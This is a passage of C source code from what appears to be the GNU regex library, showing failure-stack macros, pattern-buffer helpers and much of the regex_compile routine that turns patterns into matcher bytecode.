									\
  low_reg = (unsigned) POP_FAILURE_ITEM ();				\
  DEBUG_PRINT2 ("  Popping  low active reg: %d\n", low_reg);		\
									\
  for (this_reg = high_reg; this_reg >= low_reg; this_reg--)		\
    {									\
      DEBUG_PRINT2 ("    Popping reg: %d\n", this_reg);			\
									\
      reg_info[this_reg].word = POP_FAILURE_ITEM ();			\
      DEBUG_PRINT2 ("      info: 0x%x\n", reg_info[this_reg]);		\
									\
      regend[this_reg] = (const char *) POP_FAILURE_ITEM ();		\
      DEBUG_PRINT2 ("      end: 0x%x\n", regend[this_reg]);		\
									\
      regstart[this_reg] = (const char *) POP_FAILURE_ITEM ();		\
      DEBUG_PRINT2 ("      start: 0x%x\n", regstart[this_reg]);		\
    }									\
									\
  DEBUG_STATEMENT (nfailure_points_popped++);				\
} /* POP_FAILURE_POINT */



/* Structure for per-register (a.k.a. per-group) information.
   This must not be longer than one word, because we push this value
   onto the failure stack.  Other register information, such as the
   starting and ending positions (which are addresses), and the list of
   inner groups (which is a bits list) are maintained in separate
   variables.  
   
   We are making a (strictly speaking) nonportable assumption here: that
   the compiler will pack our bit fields into something that fits into
   the type of `word', i.e., is something that fits into one item on the
   failure stack.  */
typedef union
{
  fail_stack_elt_t word;
  struct
  {
      /* This field is one if this group can match the empty string,
         zero if not.  If not yet determined,  `MATCH_NULL_UNSET_VALUE'.  */
#define MATCH_NULL_UNSET_VALUE 3
    unsigned match_null_string_p : 2;
    unsigned is_active : 1;
    unsigned matched_something : 1;
    unsigned ever_matched_something : 1;
  } bits;
} register_info_type;

#define REG_MATCH_NULL_STRING_P(R)  ((R).bits.match_null_string_p)
#define IS_ACTIVE(R)  ((R).bits.is_active)
#define MATCHED_SOMETHING(R)  ((R).bits.matched_something)
#define EVER_MATCHED_SOMETHING(R)  ((R).bits.ever_matched_something)


/* Call this when have matched a real character; it sets `matched' flags
   for the subexpressions which we are currently inside.  Also records
   that those subexprs have matched.  */
#define SET_REGS_MATCHED()						\
  do									\
    {									\
      unsigned r;							\
      for (r = lowest_active_reg; r <= highest_active_reg; r++)		\
        {								\
          MATCHED_SOMETHING (reg_info[r])				\
            = EVER_MATCHED_SOMETHING (reg_info[r])			\
            = 1;							\
        }								\
    }									\
  while (0)


/* Registers are set to a sentinel when they haven't yet matched.  */
#define REG_UNSET_VALUE ((char *) -1)
#define REG_UNSET(e) ((e) == REG_UNSET_VALUE)



/* How do we implement a missing MATCH_MAY_ALLOCATE?
   We make the fail stack a global thing, and then grow it to
   re_max_failures when we compile.  */
#ifndef MATCH_MAY_ALLOCATE
static fail_stack_type fail_stack;

static const char **     regstart, **     regend;
static const char ** old_regstart, ** old_regend;
static const char **best_regstart, **best_regend;
static register_info_type *reg_info; 
static const char **reg_dummy;
static register_info_type *reg_info_dummy;
#endif


/* Subroutine declarations and macros for regex_compile.  */

static void store_op1 (), store_op2 ();
static void insert_op1 (), insert_op2 ();
static boolean at_begline_loc_p (), at_endline_loc_p ();
static boolean group_in_compile_stack ();
static reg_errcode_t compile_range ();

/* Fetch the next character in the uncompiled pattern---translating it 
   if necessary.  Also cast from a signed character in the constant
   string passed to us by the user to an unsigned char that we can use
   as an array index (in, e.g., `translate').  */
#define PATFETCH(c)							\
  do {if (p == pend) return REG_EEND;					\
    c = (unsigned char) *p++;						\
    if (translate) c = translate[c]; 					\
  } while (0)

/* Fetch the next character in the uncompiled pattern, with no
   translation.  */
#define PATFETCH_RAW(c)							\
  do {if (p == pend) return REG_EEND;					\
    c = (unsigned char) *p++; 						\
  } while (0)

/* Go backwards one character in the pattern.  */
#define PATUNFETCH p--


/* If `translate' is non-null, return translate[D], else just D.  We
   cast the subscript to translate because some data is declared as
   `char *', to avoid warnings when a string constant is passed.  But
   when we use a character as a subscript we must make it unsigned.  */
#define TRANSLATE(d) (translate ? translate[(unsigned char) (d)] : (d))


/* Macros for outputting the compiled pattern into `buffer'.  */

/* If the buffer isn't allocated when it comes in, use this.  */
#define INIT_BUF_SIZE  32

/* Make sure we have at least N more bytes of space in buffer.  */
#define GET_BUFFER_SPACE(n)						\
    while (b - bufp->buffer + (n) > bufp->allocated)			\
      EXTEND_BUFFER ()

/* Make sure we have one more byte of buffer space and then add C to it.  */
#define BUF_PUSH(c)							\
  do {									\
    GET_BUFFER_SPACE (1);						\
    *b++ = (unsigned char) (c);						\
  } while (0)


/* Ensure we have two more bytes of buffer space and then append C1 and C2.  */
#define BUF_PUSH_2(c1, c2)						\
  do {									\
    GET_BUFFER_SPACE (2);						\
    *b++ = (unsigned char) (c1);					\
    *b++ = (unsigned char) (c2);					\
  } while (0)


/* As with BUF_PUSH_2, except for three bytes.  */
#define BUF_PUSH_3(c1, c2, c3)						\
  do {									\
    GET_BUFFER_SPACE (3);						\
    *b++ = (unsigned char) (c1);					\
    *b++ = (unsigned char) (c2);					\
    *b++ = (unsigned char) (c3);					\
  } while (0)


/* Store a jump with opcode OP at LOC to location TO.  We store a
   relative address offset by the three bytes the jump itself occupies.  */
#define STORE_JUMP(op, loc, to) \
  store_op1 (op, loc, (to) - (loc) - 3)

/* Likewise, for a two-argument jump.  */
#define STORE_JUMP2(op, loc, to, arg) \
  store_op2 (op, loc, (to) - (loc) - 3, arg)

/* Like `STORE_JUMP', but for inserting.  Assume `b' is the buffer end.  */
#define INSERT_JUMP(op, loc, to) \
  insert_op1 (op, loc, (to) - (loc) - 3, b)

/* Like `STORE_JUMP2', but for inserting.  Assume `b' is the buffer end.  */
#define INSERT_JUMP2(op, loc, to, arg) \
  insert_op2 (op, loc, (to) - (loc) - 3, arg, b)


/* This is not an arbitrary limit: the arguments which represent offsets
   into the pattern are two bytes long.  So if 2^16 bytes turns out to
   be too small, many things would have to change.  */
#define MAX_BUF_SIZE (1L << 16)


/* Extend the buffer by twice its current size via realloc and
   reset the pointers that pointed into the old block to point to the
   correct places in the new one.  If extending the buffer results in it
   being larger than MAX_BUF_SIZE, then flag memory exhausted.  */
#define EXTEND_BUFFER()							\
  do { 									\
    unsigned char *old_buffer = bufp->buffer;				\
    if (bufp->allocated == MAX_BUF_SIZE) 				\
      return REG_ESIZE;							\
    bufp->allocated <<= 1;						\
    if (bufp->allocated > MAX_BUF_SIZE)					\
      bufp->allocated = MAX_BUF_SIZE; 					\
    bufp->buffer = (unsigned char *) realloc (bufp->buffer, bufp->allocated);\
    if (bufp->buffer == NULL)						\
      return REG_ESPACE;						\
    /* If the buffer moved, move all the pointers into it.  */		\
    if (old_buffer != bufp->buffer)					\
      {									\
        b = (b - old_buffer) + bufp->buffer;				\
        begalt = (begalt - old_buffer) + bufp->buffer;			\
        if (fixup_alt_jump)						\
          fixup_alt_jump = (fixup_alt_jump - old_buffer) + bufp->buffer;\
        if (laststart)							\
          laststart = (laststart - old_buffer) + bufp->buffer;		\
        if (pending_exact)						\
          pending_exact = (pending_exact - old_buffer) + bufp->buffer;	\
      }									\
  } while (0)


/* Since we have one byte reserved for the register number argument to
   {start,stop}_memory, the maximum number of groups we can report
   things about is what fits in that byte.  */
#define MAX_REGNUM 255

/* But patterns can have more than `MAX_REGNUM' registers.  We just
   ignore the excess.  */
typedef unsigned regnum_t;


/* Macros for the compile stack.  */

/* Since offsets can go either forwards or backwards, this type needs to
   be able to hold values from -(MAX_BUF_SIZE - 1) to MAX_BUF_SIZE - 1.  */
typedef int pattern_offset_t;

typedef struct
{
  pattern_offset_t begalt_offset;
  pattern_offset_t fixup_alt_jump;
  pattern_offset_t inner_group_offset;
  pattern_offset_t laststart_offset;  
  regnum_t regnum;
} compile_stack_elt_t;


typedef struct
{
  compile_stack_elt_t *stack;
  unsigned size;
  unsigned avail;			/* Offset of next open position.  */
} compile_stack_type;


#define INIT_COMPILE_STACK_SIZE 32

#define COMPILE_STACK_EMPTY  (compile_stack.avail == 0)
#define COMPILE_STACK_FULL  (compile_stack.avail == compile_stack.size)

/* The next available element.  */
#define COMPILE_STACK_TOP (compile_stack.stack[compile_stack.avail])


/* Set the bit for character C in a list.  */
#define SET_LIST_BIT(c)                               \
  (b[((unsigned char) (c)) / BYTEWIDTH]               \
   |= 1 << (((unsigned char) c) % BYTEWIDTH))


/* Get the next unsigned number in the uncompiled pattern.  */
#define GET_UNSIGNED_NUMBER(num) 					\
  { if (p != pend)							\
     {									\
       PATFETCH (c); 							\
       while (ISDIGIT (c)) 						\
         { 								\
           if (num < 0)							\
              num = 0;							\
           num = num * 10 + c - '0'; 					\
           if (p == pend) 						\
              break; 							\
           PATFETCH (c);						\
         } 								\
       } 								\
    }		

#define CHAR_CLASS_MAX_LENGTH  6 /* Namely, `xdigit'.  */

#define IS_CHAR_CLASS(string)						\
   (STREQ (string, "alpha") || STREQ (string, "upper")			\
    || STREQ (string, "lower") || STREQ (string, "digit")		\
    || STREQ (string, "alnum") || STREQ (string, "xdigit")		\
    || STREQ (string, "space") || STREQ (string, "print")		\
    || STREQ (string, "punct") || STREQ (string, "graph")		\
    || STREQ (string, "cntrl") || STREQ (string, "blank"))

/* `regex_compile' compiles PATTERN (of length SIZE) according to SYNTAX.
   Returns one of error codes defined in `regex.h', or zero for success.

   Assumes the `allocated' (and perhaps `buffer') and `translate'
   fields are set in BUFP on entry.

   If it succeeds, results are put in BUFP (if it returns an error, the
   contents of BUFP are undefined):
     `buffer' is the compiled pattern;
     `syntax' is set to SYNTAX;
     `used' is set to the length of the compiled pattern;
     `fastmap_accurate' is zero;
     `re_nsub' is the number of subexpressions in PATTERN;
     `not_bol' and `not_eol' are zero;
   
   The `fastmap' and `newline_anchor' fields are neither
   examined nor set.  */

/* Return, freeing storage we allocated.  */
#define FREE_STACK_RETURN(value)		\
  return (free (compile_stack.stack), value)

static reg_errcode_t
regex_compile (pattern, size, syntax, bufp)
     const char *pattern;
     int size;
     reg_syntax_t syntax;
     struct re_pattern_buffer *bufp;
{
  /* We fetch characters from PATTERN here.  Even though PATTERN is
     `char *' (i.e., signed), we declare these variables as unsigned, so
     they can be reliably used as array indices.  */
  register unsigned char c, c1;
  
  /* A random temporary spot in PATTERN.  */
  const char *p1;

  /* Points to the end of the buffer, where we should append.  */
  register unsigned char *b;
  
  /* Keeps track of unclosed groups.  */
  compile_stack_type compile_stack;

  /* Points to the current (ending) position in the pattern.  */
  const char *p = pattern;
  const char *pend = pattern + size;
  
  /* How to translate the characters in the pattern.  */
  char *translate = bufp->translate;

  /* Address of the count-byte of the most recently inserted `exactn'
     command.  This makes it possible to tell if a new exact-match
     character can be added to that command or if the character requires
     a new `exactn' command.  */
  unsigned char *pending_exact = 0;

  /* Address of start of the most recently finished expression.
     This tells, e.g., postfix * where to find the start of its
     operand.  Reset at the beginning of groups and alternatives.  */
  unsigned char *laststart = 0;

  /* Address of beginning of regexp, or inside of last group.  */
  unsigned char *begalt;

  /* Place in the uncompiled pattern (i.e., the {) to
     which to go back if the interval is invalid.  */
  const char *beg_interval;
                
  /* Address of the place where a forward jump should go to the end of
     the containing expression.  Each alternative of an `or' -- except the
     last -- ends with a forward jump of this sort.  */
  unsigned char *fixup_alt_jump = 0;

  /* Counts open-groups as they are encountered.  Remembered for the
     matching close-group on the compile stack, so the same register
     number is put in the stop_memory as the start_memory.  */
  regnum_t regnum = 0;

#ifdef DEBUG
  DEBUG_PRINT1 ("\nCompiling pattern: ");
  if (debug)
    {
      unsigned debug_count;
      
      for (debug_count = 0; debug_count < size; debug_count++)
        printchar (pattern[debug_count]);
      putchar ('\n');
    }
#endif /* DEBUG */

  /* Initialize the compile stack.  */
  compile_stack.stack = TALLOC (INIT_COMPILE_STACK_SIZE, compile_stack_elt_t);
  if (compile_stack.stack == NULL)
    return REG_ESPACE;

  compile_stack.size = INIT_COMPILE_STACK_SIZE;
  compile_stack.avail = 0;

  /* Initialize the pattern buffer.  */
  bufp->syntax = syntax;
  bufp->fastmap_accurate = 0;
  bufp->not_bol = bufp->not_eol = 0;

  /* Set `used' to zero, so that if we return an error, the pattern
     printer (for debugging) will think there's no pattern.  We reset it
     at the end.  */
  bufp->used = 0;
  
  /* Always count groups, whether or not bufp->no_sub is set.  */
  bufp->re_nsub = 0;				

#if !defined (emacs) && !defined (SYNTAX_TABLE)
  /* Initialize the syntax table.  */
   init_syntax_once ();
#endif

  if (bufp->allocated == 0)
    {
      if (bufp->buffer)
	{ /* If zero allocated, but buffer is non-null, try to realloc
             enough space.  This loses if buffer's address is bogus, but
             that is the user's responsibility.  */
          RETALLOC (bufp->buffer, INIT_BUF_SIZE, unsigned char);
        }
      else
        { /* Caller did not allocate a buffer.  Do it for them.  */
          bufp->buffer = TALLOC (INIT_BUF_SIZE, unsigned char);
        }
      if (!bufp->buffer) FREE_STACK_RETURN (REG_ESPACE);

      bufp->allocated = INIT_BUF_SIZE;
    }

  begalt = b = bufp->buffer;

  /* Loop through the uncompiled pattern until we're at the end.  */
  while (p != pend)
    {
      PATFETCH (c);

      switch (c)
        {
        case '^':
          {
            if (   /* If at start of pattern, it's an operator.  */
                   p == pattern + 1
                   /* If context independent, it's an operator.  */
                || syntax & RE_CONTEXT_INDEP_ANCHORS
                   /* Otherwise, depends on what's come before.  */
                || at_begline_loc_p (pattern, p, syntax))
              BUF_PUSH (begline);
            else
              goto normal_char;
          }
          break;


        case '$':
          {
            if (   /* If at end of pattern, it's an operator.  */
                   p == pend 
                   /* If context independent, it's an operator.  */
                || syntax & RE_CONTEXT_INDEP_ANCHORS
                   /* Otherwise, depends on what's next.  */
                || at_endline_loc_p (p, pend, syntax))
               BUF_PUSH (endline);
             else
               goto normal_char;
           }
           break;


	case '+':
        case '?':
          if ((syntax & RE_BK_PLUS_QM)
              || (syntax & RE_LIMITED_OPS))
            goto normal_char;
        handle_plus:
        case '*':
          /* If there is no previous pattern... */
          if (!laststart)
            {
              if (syntax & RE_CONTEXT_INVALID_OPS)
                FREE_STACK_RETURN (REG_BADRPT);
              else if (!(syntax & RE_CONTEXT_INDEP_OPS))
                goto normal_char;
            }

          {
            /* Are we optimizing this jump?  */
            boolean keep_string_p = false;
            
            /* 1 means zero (many) matches is allowed.  */
            char zero_times_ok = 0, many_times_ok = 0;

            /* If there is a sequence of repetition chars, collapse it
               down to just one (the right one).  We can't combine
               interval operators with these because of, e.g., `a{2}*',
               which should only match an even number of `a's.  */

            for (;;)
              {
                zero_times_ok |= c != '+';
                many_times_ok |= c != '?';

                if (p == pend)
                  break;

                PATFETCH (c);

                if (c == '*'
                    || (!(syntax & RE_BK_PLUS_QM) && (c == '+' || c == '?')))
                  ;

                else if (syntax & RE_BK_PLUS_QM  &&  c == '\\')
                  {
                    if (p == pend) FREE_STACK_RETURN (REG_EESCAPE);

                    PATFETCH (c1);
                    if (!(c1 == '+' || c1 == '?'))
                      {
                        PATUNFETCH;
                        PATUNFETCH;
                        break;
                      }

                    c = c1;
                  }
                else
                  {
                    PATUNFETCH;
                    break;
                  }

                /* If we get here, we found another repeat character.  */
               }

            /* Star, etc. applied to an empty pattern is equivalent
               to an empty pattern.  */
            if (!laststart)  
              break;

            /* Now we know whether or not zero matches is allowed
               and also whether or not two or more matches is allowed.  */
            if (many_times_ok)
              { /* More than one repetition is allowed, so put in at the
                   end a backward relative jump from `b' to before the next
                   jump we're going to put in below (which jumps from
                   laststart to after this jump).  

                   But if we are at the `*' in the exact sequence `.*\n',
                   insert an unconditional jump backwards to the .,
                   instead of the beginning of the loop.  This way we only
                   push a failure point once, instead of every time
                   through the loop.  */
                assert (p - 1 > pattern);

                /* Allocate the space for the jump.  */
                GET_BUFFER_SPACE (3);

                /* We know we are not at the first character of the pattern,
                   because laststart was nonzero.  And we've already
                   incremented `p', by the way, to be the character after
                   the `*'.  Do we have to do something analogous here
                   for null bytes, because of RE_DOT_NOT_NULL?  */
                if (TRANSLATE (*(p - 2)) == TRANSLATE ('.')
		    && zero_times_ok
                    && p < pend && TRANSLATE (*p) == TRANSLATE ('\n')
                    && !(syntax & RE_DOT_NEWLINE))
                  { /* We have .*\n.  */
                    STORE_JUMP (jump, b, laststart);
                    keep_string_p = true;
                  }
                else
                  /* Anything else.  */
                  STORE_JUMP (maybe_pop_jump, b, laststart - 3);

                /* We've added more stuff to the buffer.  */
                b += 3;
              }

            /* On failure, jump from laststart to b + 3, which will be the
               end of the buffer after this jump is inserted.  */
            GET_BUFFER_SPACE (3);
            INSERT_JUMP (keep_string_p ? on_failure_keep_string_jump
                                       : on_failure_jump,
                         laststart, b + 3);
            pending_exact = 0;
            b += 3;

            if (!zero_times_ok)
              {
                /* At least one repetition is required, so insert a
                   `dummy_failure_jump' before the initial
                   `on_failure_jump' instruction of the loop. This
                   effects a skip over that instruction the first time
                   we hit that loop.  */
                GET_BUFFER_SPACE (3);
                INSERT_JUMP (dummy_failure_jump, laststart, laststart + 6);
                b += 3;
              }
            }
	  break;


	case '.':
          laststart = b;
          BUF_PUSH (anychar);
          break;


        case '[':
          {
            boolean had_char_class = false;

            if (p == pend) FREE_STACK_RETURN (REG_EBRACK);

            /* Ensure that we have enough space to push a charset: the
               opcode, the length count, and the bitset; 34 bytes in all.  */
	    GET_BUFFER_SPACE (34);

            laststart = b;

            /* We test `*p == '^' twice, instead of using an if
               statement, so we only need one BUF_PUSH.  */
            BUF_PUSH (*p == '^' ? charset_not : charset); 
            if (*p == '^')
              p++;

            /* Remember the first position in the bracket expression.  */
            p1 = p;

            /* Push the number of bytes in the bitmap.  */
            BUF_PUSH ((1 << BYTEWIDTH) / BYTEWIDTH);

            /* Clear the whole map.  */
            bzero (b, (1 << BYTEWIDTH) / BYTEWIDTH);

            /* charset_not matches newline according to a syntax bit.  */
            if ((re_opcode_t) b[-2] == charset_not
                && (syntax & RE_HAT_LISTS_NOT_NEWLINE))
              SET_LIST_BIT ('\n');

            /* Read in characters and ranges, setting map bits.  */
            for (;;)
              {
                if (p == pend) FREE_STACK_RETURN (REG_EBRACK);

                PATFETCH (c);

                /* \ might escape characters inside [...] and [^...].  */
                if ((syntax & RE_BACKSLASH_ESCAPE_IN_LISTS) && c == '\\')
                  {
                    if (p == pend) FREE_STACK_RETURN (REG_EESCAPE);

                    PATFETCH (c1);
                    SET_LIST_BIT (c1);
                    continue;
                  }

                /* Could be the end of the bracket expression.  If it's
                   not (i.e., when the bracket expression is `[]' so
                   far), the ']' character bit gets set way below.  */
                if (c == ']' && p != p1 + 1)
                  break;

                /* Look ahead to see if it's a range when the last thing
                   was a character class.  */
                if (had_char_class && c == '-' && *p != ']')
                  FREE_STACK_RETURN (REG_ERANGE);

                /* Look ahead to see if it's a range when the last thing
                   was a character: if this is a hyphen not at the
                   beginning or the end of a list, then it's the range
                   operator.  */
                if (c == '-' 
                    && !(p - 2 >= pattern && p[-2] == '[') 
                    && !(p - 3 >= pattern && p[-3] == '[' && p[-2] == '^')
                    && *p != ']')
                  {
                    reg_errcode_t ret
                      = compile_range (&p, pend, translate, syntax, b);
                    if (ret != REG_NOERROR) FREE_STACK_RETURN (ret);
                  }

                else if (p[0] == '-' && p[1] != ']')
                  { /* This handles ranges made up of characters only.  */
                    reg_errcode_t ret;

		    /* Move past the `-'.  */
                    PATFETCH (c1);
                    
                    ret = compile_range (&p, pend, translate, syntax, b);
                    if (ret != REG_NOERROR) FREE_STACK_RETURN (ret);
                  }

                /* See if we're at the beginning of a possible character
                   class.  */

                else if (syntax & RE_CHAR_CLASSES && c == '[' && *p == ':')
                  { /* Leave room for the null.  */
                    char str[CHAR_CLASS_MAX_LENGTH + 1];

                    PATFETCH (c);
                    c1 = 0;

                    /* If pattern is `[[:'.  */
                    if (p == pend) FREE_STACK_RETURN (REG_EBRACK);

                    for (;;)
                      {
                        PATFETCH (c);
                        if (c == ':' || c == ']' || p == pend
                            || c1 == CHAR_CLASS_MAX_LENGTH)
                          break;
                        str[c1++] = c;
                      }
                    str[c1] = '\0';

                    /* If isn't a word bracketed by `[:' and:`]':
                       undo the ending character, the letters, and leave 
                       the leading `:' and `[' (but set bits for them).  */
                    if (c == ':' && *p == ']')
                      {
                        int ch;
                        boolean is_alnum = STREQ (str, "alnum");
                        boolean is_alpha = STREQ (str, "alpha");
                        boolean is_blank = STREQ (str, "blank");
                        boolean is_cntrl = STREQ (str, "cntrl");
                        boolean is_digit = STREQ (str, "digit");
                        boolean is_graph = STREQ (str, "graph");
                        boolean is_lower = STREQ (str, "lower");
                        boolean is_print = STREQ (str, "print");
                        boolean is_punct = STREQ (str, "punct");
                        boolean is_space = STREQ (str, "space");
                        boolean is_upper = STREQ (str, "upper");
                        boolean is_xdigit = STREQ (str, "xdigit");
                        
                        if (!IS_CHAR_CLASS (str))
			  FREE_STACK_RETURN (REG_ECTYPE);

                        /* Throw away the ] at the end of the character
                           class.  */
                        PATFETCH (c);					

                        if (p == pend) FREE_STACK_RETURN (REG_EBRACK);

                        for (ch = 0; ch < 1 << BYTEWIDTH; ch++)
                          {
			    /* This was split into 3 if's to
			       avoid an arbitrary limit in some compiler.  */
                            if (   (is_alnum  && ISALNUM (ch))
                                || (is_alpha  && ISALPHA (ch))
                                || (is_blank  && ISBLANK (ch))
                                || (is_cntrl  && ISCNTRL (ch)))
			      SET_LIST_BIT (ch);
			    if (   (is_digit  && ISDIGIT (ch))
                                || (is_graph  && ISGRAPH (ch))
                                || (is_lower  && ISLOWER (ch))
                                || (is_print  && ISPRINT (ch)))
			      SET_LIST_BIT (ch);
			    if (   (is_punct  && ISPUNCT (ch))
                                || (is_space  && ISSPACE (ch))
                                || (is_upper  && ISUPPER (ch))
                                || (is_xdigit && ISXDIGIT (ch)))
			      SET_LIST_BIT (ch);
                          }
                        had_char_class = true;
                      }
                    else
                      {
                        c1++;
                        while (c1--)    
                          PATUNFETCH;
                        SET_LIST_BIT ('[');
                        SET_LIST_BIT (':');
                        had_char_class = false;
                      }
                  }
                else
                  {
                    had_char_class = false;
                    SET_LIST_BIT (c);
                  }
              }

            /* Discard any (non)matching list bytes that are all 0 at the
               end of the map.  Decrease the map-length byte too.  */
            while ((int) b[-1] > 0 && b[b[-1] - 1] == 0) 
              b[-1]--; 
            b += b[-1];
          }
          break;


	case '(':
          if (syntax & RE_NO_BK_PARENS)
            goto handle_open;
          else
            goto normal_char;


        case ')':
          if (syntax & RE_NO_BK_PARENS)
            goto handle_close;
          else
            goto normal_char;


        case '\n':
          if (syntax & RE_NEWLINE_ALT)
            goto handle_alt;
          else
            goto normal_char;


	case '|':
          if (syntax & RE_NO_BK_VBAR)
            goto handle_alt;
          else
            goto normal_char;


        case '{':
           if (syntax & RE_INTERVALS && syntax & RE_NO_BK_BRACES)
             goto handle_interval;
           else
             goto normal_char;


        case '\\':
          if (p == pend) FREE_STACK_RETURN (REG_EESCAPE);

          /* Do not translate the character after the \, so that we can
             distinguish, e.g., \B from \b, even if we normally would
             translate, e.g., B to b.  */
          PATFETCH_RAW (c);

          switch (c)
            {
            case '(':
              if (syntax & RE_NO_BK_PARENS)
                goto normal_backslash;

            handle_open:
              bufp->re_nsub++;
              regnum++;

              if (COMPILE_STACK_FULL)
                { 
                  RETALLOC (compile_stack.stack, compile_stack.size << 1,
                            compile_stack_elt_t);
                  if (compile_stack.stack == NULL) return REG_ESPACE;

                  compile_stack.size <<= 1;
                }

              /* These are the values to restore when we hit end of this
                 group.  They are all relative offsets, so that if the
                 whole pattern moves because of realloc, they will still
                 be valid.  */
              COMPILE_STACK_TOP.begalt_offset = begalt - bufp->buffer;
              COMPILE_STACK_TOP.fixup_alt_jump 
                = fixup_alt_jump ? fixup_alt_jump - bufp->buffer + 1 : 0;
              COMPILE_STACK_TOP.laststart_offset = b - bufp->buffer;
              COMPILE_STACK_TOP.regnum = regnum;

              /* We will eventually replace the 0 with the number of
                 groups inner to this one.  But do not push a
                 start_memory for groups beyond the last one we can
                 represent in the compiled pattern.  */
              if (regnum <= MAX_REGNUM)
                {
                  COMPILE_STACK_TOP.inner_group_offset = b - bufp->buffer + 2;
                  BUF_PUSH_3 (start_memory, regnum, 0);
                }
                
              compile_stack.avail++;

              fixup_alt_jump = 0;
              laststart = 0;
              begalt = b;
	      /* If we've reached MAX_REGNUM groups, then this open
		 won't actually generate any code, so we'll have to
		 clear pending_exact explicitly.  */
	      pending_exact = 0;
              break;


            case ')':
              if (syntax & RE_NO_BK_PARENS) goto normal_backslash;

              if (COMPILE_STACK_EMPTY)
                if (syntax & RE_UNMATCHED_RIGHT_PAREN_ORD)
                  goto normal_backslash;
                else
                  FREE_STACK_RETURN (REG_ERPAREN);

            handle_close:
              if (fixup_alt_jump)
                { /* Push a dummy failure point at the end of the
                     alternative for a possible future
                     `pop_failure_jump' to pop.  See comments at
                     `push_dummy_failure' in `re_match_2'.  */
                  BUF_PUSH (push_dummy_failure);
                  
                  /* We allocated space for this jump when we assigned
                     to `fixup_alt_jump', in the `handle_alt' case below.  */
                  STORE_JUMP (jump_past_alt, fixup_alt_jump, b - 1);
                }

              /* See similar code for backslashed left paren above.  */
              if (COMPILE_STACK_EMPTY)
                if (syntax & RE_UNMATCHED_RIGHT_PAREN_ORD)
                  goto normal_char;
                else
                  FREE_STACK_RETURN (REG_ERPAREN);

              /* Since we just checked for an empty stack above, this
                 ``can't happen''.  */
              assert (compile_stack.avail != 0);
              {
                /* We don't just want to restore into `regnum', because
                   later groups should continue to be numbered higher,
                   as in `(ab)c(de)' -- the second group is #2.  */
                regnum_t this_group_regnum;

                compile_stack.avail--;		
                begalt = bufp->buffer + COMPILE_STACK_TOP.begalt_offset;
                fixup_alt_jump
                  = COMPILE_STACK_TOP.fixup_alt_jump
                    ? bufp->buffer + COMPILE_STACK_TOP.fixup_alt_jump - 1 
                    : 0;
                laststart = bufp->buffer + COMPILE_STACK_TOP.laststart_offset;
                this_group_regnum = COMPILE_STACK_TOP.regnum;
		/* If we've reached MAX_REGNUM groups, then this open
		   won't actually generate any code, so we'll have to
		   clear pending_exact explicitly.  */
		pending_exact = 0;

                /* We're at the end of the group, so now we know how many
                   groups were inside this one.  */
                if (this_group_regnum <= MAX_REGNUM)
                  {
                    unsigned char *inner_group_loc
                      = bufp->buffer + COMPILE_STACK_TOP.inner_group_offset;
                    
                    *inner_group_loc = regnum - this_group_regnum;
                    BUF_PUSH_3 (stop_memory, this_group_regnum,
                                regnum - this_group_regnum);
                  }
              }
              break;


            case '|':					/* `\|'.  */
              if (syntax & RE_LIMITED_OPS || syntax & RE_NO_BK_VBAR)
                goto normal_backslash;
            handle_alt:
              if (syntax & RE_LIMITED_OPS)
                goto normal_char;

              /* Insert before the previous alternative a jump which
                 jumps to this alternative if the former fails.  */
              GET_BUFFER_SPACE (3);
              INSERT_JUMP (on_failure_jump, begalt, b + 6);
              pending_exact = 0;
              b += 3;

              /* The alternative before this one has a jump after it
                 which gets executed if it gets matched.  Adjust that
                 jump so it will jump to this alternative's analogous
                 jump (put in below, which in turn will jump to the next
                 (if any) alternative's such jump, etc.).  The last such
                 jump jumps to the correct final destination.  A picture:
                          _____ _____ 
                          |   | |   |   
                          |   v |   v 
                         a | b   | c   

                 If we are at `b', then fixup_alt_jump right now points to a
                 three-byte space after `a'.  We'll put in the jump, set
                 fixup_alt_jump to right after `b', and leave behind three
                 bytes which we'll fill in when we get to after `c'.  */

              if (fixup_alt_jump)
                STORE_JUMP (jump_past_alt, fixup_alt_jump, b);

              /* Mark and leave space for a jump after this alternative,
                 to be filled in later either by next alternative or
                 when know we're at the end of a series of alternatives.  */
              fixup_alt_jump = b;
              GET_BUFFER_SPACE (3);
              b += 3;

              laststart = 0;
              begalt = b;
              break;


            case '{': 
              /* If \{ is a literal.  */
              if (!(syntax & RE_INTERVALS)
                     /* If we're at `\{' and it's not the open-interval 
                        operator.  */
                  || ((syntax & RE_INTERVALS) && (syntax & RE_NO_BK_BRACES))
                  || (p - 2 == pattern  &&  p == pend))
                goto normal_backslash;

            handle_interval:
              {
                /* If got here, then the syntax allows intervals.  */

                /* At least (most) this many matches must be made.  */
                int lower_bound = -1, upper_bound = -1;

                beg_interval = p - 1;

                if (p == pend)
                  {
                    if (syntax & RE_NO_BK_BRACES)
                      goto unfetch_interval;
                    else
                      FREE_STACK_RETURN (REG_EBRACE);
                  }

                GET_UNSIGNED_NUMBER (lower_bound);

                if (c == ',')
                  {
                    GET_UNSIGNED_NUMBER (upper_bound);
                    if (upper_bound < 0) upper_bound = RE_DUP_MAX;
                  }
                else
                  /* Interval such as `{1}' => match exactly once. */
                  upper_bound = lower_bound;

                if (lower_bound < 0 || upper_bound > RE_DUP_MAX
                    || lower_bound > upper_bound)
                  {
                    if (syntax & RE_NO_BK_BRACES)
                      goto unfetch_interval;
                    else 
                      FREE_STACK_RETURN (REG_BADBR);
                  }

                if (!(syntax & RE_NO_BK_BRACES)) 
                  {
                    if (c != '\\') FREE_STACK_RETURN (REG_EBRACE);

                    PATFETCH (c);
                  }

                if (c != '}')
                  {
                    if (syntax & RE_NO_BK_BRACES)
                      goto unfetch_interval;
                    else 
                      FREE_STACK_RETURN (REG_BADBR);
                  }

                /* We just parsed a valid interval.  */

                /* If it's invalid to have no preceding re.  */
                if (!laststart)
                  {
                    if (syntax & RE_CONTEXT_INVALID_OPS)
                      FREE_STACK_RETURN (REG_BADRPT);
                    else if (syntax & RE_CONTEXT_INDEP_OPS)
                      laststart = b;
                    else
                      goto unfetch_interval;
                  }

                /* If the upper bound is zero, don't want to succeed at
                   all; jump from `laststart' to `b + 3', which will be
                   the end of the buffer after we insert the jump.  */
                 if (upper_bound == 0)
                   {
                     GET_BUFFER_SPACE (3);
                     INSERT_JUMP (jump, laststart, b + 3);
                     b += 3;
                   }

                 /* Otherwise, we have a nontrivial interval.  When
                    we're all done, the pattern will look like:
                      set_number_at <jump count> <upper bound>
                      set_number_at <succeed_n count> <lower bound>
                      succeed_n <after jump addr> <succeed_n count>
                      <body of loop>
                      jump_n <succeed_n addr> <jump count>
